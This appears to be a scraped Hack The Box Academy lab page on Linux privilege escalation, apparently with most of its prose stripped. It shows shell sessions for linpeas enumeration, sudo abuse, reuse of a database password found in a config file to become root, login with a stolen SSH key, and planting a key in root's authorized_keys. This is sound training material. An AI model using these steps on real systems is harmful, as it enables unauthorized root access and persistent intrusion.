<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/77/section/844
// Platform Version: V1
// Module ID: 77
// Module Name: Getting Started
// Module Difficulty: Fundamental
// Section ID: 844
// Section Title: Privilege Escalation
// Page Title: Hack The Box - Academy
// Page Number: 11
-->

# Privilege Escalation

**Module Name:** Getting Started **Page Number:** 11

#### 

#### GETTING STARTED

# Privilege Escalation

## PrivEsc Checklists

## Enumeration Scripts

``` shell-session
[!bash!]$ ./linpeas.sh
...SNIP...

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEYEND:
  RED/YELLOW: 99% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
  LightMangenta: Your username


====================================( Basic information )=====================================
OS: Linux version 3.9.0-73-generic
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
...SNIP...
```

## Kernel Exploits

## Vulnerable Software

## User Privileges

``` shell-session
[!bash!]$ sudo -l

[sudo] password for user1:
...SNIP...

User user1 may run the following commands on ExampleServer:
    (ALL : ALL) ALL
```

``` shell-session
[!bash!]$ sudo su -

[sudo] password for user1:
whoami
root
```

``` shell-session
[!bash!]$ sudo -l

    (user : user) NOPASSWD: /bin/echo
```

``` shell-session
[!bash!]$ sudo -u user /bin/echo Hello World!

    Hello World!
```

## Scheduled Tasks

## Exposed Credentials

``` shell-session
...SNIP...
[+] Searching passwords in config PHP files
[+] Finding passwords inside logs (limit 70)
...SNIP...
/var/www/html/config.php: $conn = new mysqli(localhost, 'db_user', 'password123');
```

``` shell-session
[!bash!]$ su -

Password: password123
whoami

root
```

## SSH Keys

``` shell-session
[!bash!]$ vim id_rsa
[!bash!]$ chmod 600 id_rsa
[!bash!]$ ssh root@10.10.10.10 -i id_rsa

root@10.10.10.10#
```

``` shell-session
[!bash!]$ ssh-keygen -f key

Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): *******
Enter same passphrase again: *******

Your identification has been saved in key
Your public key has been saved in key.pub
The key fingerprint is:
SHA256:...SNIP... user@parrot
The key's randomart image is:
+---[RSA 3072]----+
|   ..o.++.+      |
...SNIP...
|     . ..oo+.    |
+----[SHA256]-----+
```

``` shell-session
user@remotehost$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
```

``` shell-session
[!bash!]$ ssh root@10.10.10.10 -i key

root@remotehost#
```

# 

# 

#### Questions

####